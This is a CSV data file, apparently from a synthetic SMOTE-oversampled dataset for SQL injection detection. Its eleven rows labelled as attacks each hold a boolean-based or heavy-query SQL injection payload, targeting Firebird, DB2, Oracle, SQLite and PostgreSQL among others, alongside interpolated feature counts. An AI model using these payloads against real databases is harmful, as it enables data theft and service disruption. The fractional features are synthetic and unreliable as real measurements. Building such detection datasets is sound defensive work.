id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,1.425819709252182,90.95418842811179,28.109562663784434,3.6549171789699404,27.844625764327354,15.374499563241512,36.03187554594811,11.70318755459481,0.30202400364924165,0.17412282548862498,0.394626411354781,0.12922675950735238,1.296812445405189,0.0,0.0,0.0,1.0,1.296812445405189,0.0,6.109562663784433,0.0,0.703187554594811,0.7031875545948111,2.890437336215567,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.29681244540518914,0.703187554594811,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,1.970458715593907,143.39964331446916,31.444345365130317,4.23270704103009,85.37773814605214,7.133214438156384,35.13321443815639,15.755476292104255,0.5971060842623812,0.04873467705594953,0.24468785023054165,0.10947138845112755,3.688869073026064,0.0,0.0,0.0,1.0,0.6888690730260638,0.0,4.0,0.0,0.0,2.688869073026064,1.6888690730260643,1.0,0.0,0.0,0.0,0.0,0.6888690730260638,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.688869073026064
SMOTE_000003,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,0.431547994712095,83.97806211296407,22.0,3.178048806809592,13.611288820602542,15.633226707638475,40.73354658472305,14.0,0.16166055403700225,0.18666871745353744,0.484808934464908,0.16686179404455223,0.0,4.0,0.8777422358794913,0.0,1.0,1.8777422358794913,0.0,6.244515528241018,0.0,0.0,0.0,3.7554844717589826,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1222577641205087,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000004,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,1.211453740396078,127.37120856172122,31.68560428086061,4.269442942046897,77.48483424688489,5.25758287655756,29.628791438278782,15.0,0.6081573721889613,0.041386766738125164,0.23268354760725252,0.11777231346566107,0.0,2.37120856172122,0.6287914382787796,0.0,1.0,1.0,0.0,3.3143957191393896,0.3143957191393898,0.0,2.68560428086061,2.6287914382787796,0.0,1.0,0.3143957191393898,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,0.24091657607648842,167.636483180874,36.121172273042006,3.9548309298418607,51.060586136521,23.939413863478997,62.63648318087398,30.0,0.30462661040237193,0.14280371592899382,0.3735975431360879,0.17897213053254632,3.9394138634789964,0.0,0.12117227304200773,0.0,0.0,2.0,0.0,11.939413863478997,0.0,2.0,1.0,10.121172273042006,1.0,0.0,0.060586136521003864,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.060586136521003864,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,1.2483760871130765,103.8578852711155,29.030192411228764,3.5476940688775076,31.67673080374292,13.0,44.4742312524009,14.706923214971685,0.30699181415944304,0.12615859055699286,0.4257871188291148,0.14106247645444928,0.6767308037429214,0.0,2.0,0.0,1.0,1.0,0.0,8.030192411228764,0.0,1.0,1.0,4.0,0.6767308037429214,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6767308037429214,0.32326919625707856,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,0.809790203178145,126.42031249694601,31.210156248473,4.128279441642433,73.68124998778403,7.1593750061079895,30.579687503053997,15.0,0.5826869418824823,0.05671619238554307,0.2419401623251164,0.11865670340685824,0.0,1.4203124969460055,1.5796875030539947,0.0,1.0,1.0,0.0,3.7898437515269974,0.7898437515269973,0.0,2.2101562484730026,3.5796875030539947,0.0,1.0,0.7898437515269972,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,1.2586493049516025,144.61236834647525,32.7257730216547,4.326040633309082,82.98350323820173,9.0,36.17731906496411,16.451546043309406,0.5735418229144263,0.062395351712253244,0.25032865276581057,0.11373417260750984,2.903092086618814,0.0,0.548453956690593,0.0,1.0,1.0,0.0,4.0,0.0,0.0,3.0,2.548453956690593,0.7257730216547034,0.0,0.2742269783452965,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7257730216547035,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7257730216547036
SMOTE_000009,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,2.4712384801566887,106.82778326834858,28.402924554563008,3.831793117346443,48.76645061941692,10.604386831844511,34.70511797048526,12.75182784660188,0.4353466985075542,0.09012264167992351,0.34680660336455327,0.12772405644796905,0.0,0.0,2.0,0.0,1.0,2.0,0.0,3.6510967079611283,0.0,0.0,1.1007311386407521,5.449634430679624,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000010,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000035,1.6302119709337206,116.68135548647102,28.170338871617755,3.3755584055371903,28.08305057506562,14.371186415915057,53.48474566366023,20.742372831830114,0.23189393950254025,0.12477000075917646,0.46398535476444736,0.17935070497383596,5.371186415915057,0.0,0.0,0.6855932079575282,0.0,2.0,0.0,9.371186415915055,2.0,0.3144067920424718,1.0,2.6855932079575284,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000011,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,0.3648177987363477,78.11053672683217,28.447316365839193,3.8956817933951915,23.22624291217487,15.557853092671355,27.32644072198594,12.0,0.2974673913835878,0.19924439363827506,0.3496573225279563,0.1536308924501808,0.0,4.0,1.0,0.0,0.0,1.0,0.0,4.221073453664323,0.0,0.8894632731678387,0.8894632731678388,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
